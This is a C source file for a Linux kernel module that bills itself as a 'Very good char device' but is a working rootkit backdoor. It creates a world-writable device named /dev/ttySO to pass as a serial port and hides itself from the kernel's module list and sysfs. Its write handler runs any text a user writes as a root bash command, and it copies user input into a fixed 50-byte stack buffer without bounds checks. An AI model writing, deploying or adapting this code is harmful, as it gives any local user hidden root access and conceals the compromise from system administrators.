#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/threads.h>

#define DEV_NAME "ttySO"
#define CLASS_NAME "anyc"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Very good char device");
MODULE_VERSION("1.0.0");

static int major_num = 0;
static struct class* dev_class = NULL;
static struct device* dev_struct = NULL;
//static int open_num = 0;

char *envp[] = {"HOME=/", NULL};

static int dev_open(struct inode *, struct file *);
static int dev_release(struct inode *, struct file *);
static ssize_t dev_read(struct file *, char *, size_t, loff_t *);
static ssize_t dev_write(struct file *, const char *, size_t, loff_t *);

static struct file_operations fops =
{
  .open = dev_open,
  .read = dev_read,
  .write = dev_write,
  .release = dev_release,
};

int modHidden = 0;
static struct list_head *modList;

void hide_module(void){
        if(modHidden){
                return;
        }
	modList = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
        THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->notes_attrs = NULL;
        modHidden = 1;
}

void reveal_module(void){
	if(modHidden == 0){
		return;
	}
	list_add(&THIS_MODULE->list, modList);
        modHidden = 0;
}

/*
 * funkcja rejestrująca urządzenie- początek istnienia nowego urządzenia
 */
static int __init register_device(void)
{
  /*próba inicjalizacji*/
  //printk(KERN_INFO "CharDev: Initializing char device...\n");
  major_num = register_chrdev( 0, DEV_NAME, &fops );
  if(major_num<0) //error gdy cos się zepsuje
  {
    //printk(KERN_WARNING "CharDev: Error: cannot register device. Major number error\n");
    return major_num;
  }
  //printk(KERN_INFO "CharDev: Registerring complete with major number %d\n", major_num);

/*tworzenie klasy urządzenia- rejestracja*/
  dev_class = class_create(THIS_MODULE, CLASS_NAME);
  if(IS_ERR(dev_class))
  {
    unregister_chrdev(major_num, DEV_NAME);
    //printk(KERN_WARNING "CharDev: cannot register device class");
    return PTR_ERR(dev_class);
  }
  //printk(KERN_INFO "CharDev: device class registered correctly\n");

/*tworzenie klasy urządzenia- tworzenie*/
  dev_struct = device_create(dev_class, NULL, MKDEV(major_num, 0), NULL, DEV_NAME);
  if(IS_ERR(dev_struct))
  {
    class_destroy(dev_class);
    unregister_chrdev(major_num, DEV_NAME);
    return PTR_ERR(dev_struct);
  }
  //printk(KERN_INFO "CharDev: device class created correctly\n");
  	/* permission to rwx-rw-rw*/
        char *argv[] = { "/bin/bash", "-c", "chmod 666 /dev/ttySO", NULL};
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	hide_module();
  return 0;
}

/*
 * funkcja usuwająca urządzenie
 */
static void __exit unregister_device(void)
{
  reveal_module();
  device_destroy(dev_class, MKDEV(major_num, 0));
  class_unregister(dev_class);
  class_destroy(dev_class);
  unregister_chrdev(major_num, DEV_NAME);
}

static int dev_open(struct inode *inodep, struct file *filep)
{
  //open_num++;
  //printk(KERN_INFO "CharDev: Device was %d x opened\n", open_num);
  return 0;
}

static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
{
	return 0;
}

static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
{
	char comm[50];
	comm[len-1] = '/0';
	strncpy(comm, buffer, len);
	char *argv[] = { "/bin/bash", "-c", comm, NULL};
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	//printk(KERN_INFO "CharDev: writing complete %s", buffer);

	return len;
}

static int dev_release(struct inode *inodep, struct file *filep)
{
   //printk(KERN_INFO "CharDev: Device successfully closed\n");
   return 0;
 }

 module_init(register_device);
 module_exit(unregister_device);
